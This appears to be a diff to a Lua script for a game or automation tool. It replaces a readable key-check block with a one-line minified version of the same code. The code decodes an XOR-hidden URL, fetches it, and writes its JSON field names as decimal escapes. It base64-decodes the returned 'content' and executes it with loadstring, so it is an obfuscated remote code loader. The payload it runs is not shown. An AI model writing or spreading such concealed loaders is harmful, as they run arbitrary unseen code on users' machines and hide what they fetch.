@@ -1,28 +1,3 @@
 _G.BGL_KEY = "KEY-4A58DB2F"
 
-runThread(function()
-    local function _x(d,k) local r="" for i=1,#d do local a,b=d[i],string.byte(k,(i-1)%#k+1) local p,rs=1,0 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then rs=rs+p end a,b,p=math.floor(a/2),math.floor(b/2),p*2 end r=r..string.char(rs) end return r end
-    local _d = {43,3,10,21,10,103,11,10,11,114,24,24,2,24,24,12,24,103,1,14,1,103,10,12,24,2,24,14,14,24,10,30,10,0,12,6}
-    local _u = _x(_d, "BGL_SECRET") .. (_G.BGL_KEY or ""):gsub("%s+","")
-    
-    local function _db(d)
-        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-        d=string.gsub(d,'[^'..b..'=]','')
-        return(d:gsub('.',function(x) if(x=='=')then return'' end local r,f='', (b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d%d%d%d%d%d',function(x) local n=0 for i=1,8 do n=n+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(n) end))
-    end
-
-    log("📡 BGL Script: Connecting...")
-    local s,r=pcall(fetch,_u)
-    if not s or not r or r=="" then return error("❌ Server Timeout") end
-
-    if string.find(r, '"\115\116\097\116\117\115":"\115\117\099\099\101\115\115"') then
-        log("✅ Auth Success!")
-        local e = r:match('"\099\111\110\116\101\110\116"%s*:%s*"(.-)"')
-        if e then
-            local f,er = (loadstring or load)(_db(e))
-            if f then f() else log("❌ Error") end
-        end
-    else
-        error("❌ " .. (r:match('"\109\115\103"%s*:%s*"(.-)"') or "Denied"))
-    end
-end)
+runThread(function() local function _x(d,k) local r="" for i=1,#d do local a,b=d[i],string.byte(k,(i-1)%#k+1) local p,rs=1,0 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then rs=rs+p end a,b,p=math.floor(a/2),math.floor(b/2),p*2 end r=r..string.char(rs) end return r end local _d = {43,3,10,21,10,103,11,10,11,114,24,24,2,24,24,12,24,103,1,14,1,103,10,12,24,2,24,14,14,24,10,30,10,0,12,6} local _u = _x(_d, "BGL_SECRET") .. (_G.BGL_KEY or ""):gsub("%s+","") local function _db(d) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' d=string.gsub(d,'[^'..b..'=]','') return(d:gsub('.',function(x) if(x=='=')then return'' end local r,f='', (b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d%d%d%d%d%d',function(x) local n=0 for i=1,8 do n=n+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(n) end)) end log("📡 BGL Script: Connecting...") local s,r=pcall(fetch,_u) if not s or not r or r=="" then return error("❌ Server Timeout") end if string.find(r, '"\115\116\097\116\117\115":"\115\117\099\099\101\115\115"') then log("✅ Auth Success!") local e = r:match('"\099\111\110\116\101\110\116"%s*:%s*"(.-)"') if e then local f,er = (loadstring or load)(_db(e)) if f then f() else log("❌ Error") end end else error("❌ " .. (r:match('"\109\115\103"%s*:%s*"(.-)"') or "Denied")) endend)
